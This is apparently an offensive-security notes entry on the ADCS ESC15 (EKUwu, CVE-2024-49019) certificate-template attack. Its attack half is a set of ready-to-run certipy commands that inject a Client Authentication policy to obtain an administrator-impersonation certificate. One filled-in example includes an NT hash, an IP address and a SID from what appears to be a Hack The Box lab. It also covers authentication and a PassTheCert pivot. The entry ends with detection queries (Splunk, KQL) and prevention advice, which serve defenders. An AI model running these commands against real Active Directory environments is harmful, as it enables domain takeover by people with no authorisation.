name: ADCS ESC15 / EKUwu (Application Policy Injection)
description: ESC15 (EKUwu, CVE-2024-49019) abuses Schema Version 1 certificate templates where the enrollee supplies the subject. Version 1 templates ignore the template's EKU constraints if the request includes an Application Policies extension - you can inject Client Authentication (OID 1.3.6.1.5.5.7.3.2) or Certificate Request Agent (OID 1.3.6.1.4.1.311.20.2.1) into a Server Authentication-only template, turning it into a user-impersonation cert.
notes:
=== THE IDEA ===
Schema Version 1 templates process Application Policies from the CSR instead of
enforcing the template's EKU. If the template has EnrolleeSuppliesSubject and you
can enroll, you inject a Client Authentication OID into a Server Auth template
and get a cert that authenticates as any user.

=== REQUIREMENTS ===
- Template Schema Version = 1
- EnrolleeSuppliesSubject = True
- You have enrollment rights on the template
- Environment NOT patched for CVE-2024-49019

=== USING certipy-esc15 (separate tool/fork) ===
  certipy-esc15 req \
    -ca <ca_name> \
    -username <user> \
    -hashes <nt_hash> \
    -dc-ip <dc_ip> \
    -template <template_name> \
    --application-policies '1.3.6.1.4.1.311.20.2.1' \
    -target-ip <dc_ip>

=== USING certipy-ad v5+ (built-in) ===
  certipy-ad req -u <user>@<domain> -hashes :<nt_hash> \
    -target <dc_ip> -ca <ca_name> -template <template_name> \
    -upn 'administrator@<domain>' \
    -sid '<admin_sid>' \
    -application-policies 'Client Authentication' \
    -out administrator

=== THEN AUTHENTICATE ===
  certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>
  # If auth fails (Server Auth only), pivot to PassTheCert instead

=== ESC17 ===
ESC17 is related: EnrolleeSuppliesSubject + Server Authentication template.
The cert may work directly for auth if the CA processes it, or requires
ESC15 application-policy injection.

examples.label: certipy-ad v5: inject Client Auth with UPN+SID
examples.command: certipy-ad req -u cert_admin -hashes :0ef3298edfc59e0cd07c56d829eea9c6 -target 10.129.232.167 -ca tombwatcher-CA-1 -template WebServer -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication' -out administrator

recommended.note: If the cert has no Client Authentication EKU and certipy-ad auth fails, pivot to PassTheCert for LDAP shell access.
The enrollment account (e.g. cert_admin) may need to be restored from the Recycle Bin first.

defense.why_it_works: Schema Version 1 certificate templates evaluate Application Policies from the CSR rather than enforcing the template's configured EKU, allowing an enrollee to override the intended certificate purpose.
defense.prerequisites: Enrollment rights on a Schema Version 1 template with EnrolleeSuppliesSubject; unpatched CA (pre-CVE-2024-49019 fix).
defense.impact: Domain Admin impersonation via certificate-based authentication.
defense.detection: [MITRE T1649] Event 4887 (certificate request) with Application Policies that differ from the template's EKU; Event 4886 (certificate issued) for templates not intended for client auth.
defense.artifacts: Certificate request with injected Application Policies; PFX file on attacker disk; 4768 PKINIT TGT request.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4887
| where CertificateTemplate="WebServer" AND ApplicationPolicies!="1.3.6.1.5.5.7.3.1"
| table _time, Requester, CertificateTemplate, ApplicationPolicies
defense.sentinel_kql:
SecurityEvent
| where EventID == 4887
| where CertificateTemplate has "WebServer"
| project TimeGenerated, Requester, CertificateTemplate, SubjectName
defense.prevention: Patch CVE-2024-49019; upgrade Schema Version 1 templates to Version 2+; remove EnrolleeSuppliesSubject from templates that do not require it; restrict enrollment rights.

detections.name: ESC15 - application policy injection in cert request
detections.logic:
SecurityEvent
| where EventID in (4886, 4887)
| where CertificateTemplate has_any ("WebServer", "DomainController", "IPSECIntermediateOnline")
| project TimeGenerated, Requester, CertificateTemplate, SubjectName
| sort by TimeGenerated desc
detections.false_positives: Legitimate certificate requests for Server Authentication templates
detections.tuning: Alert on requests from non-admin accounts to templates that normally only serve machines
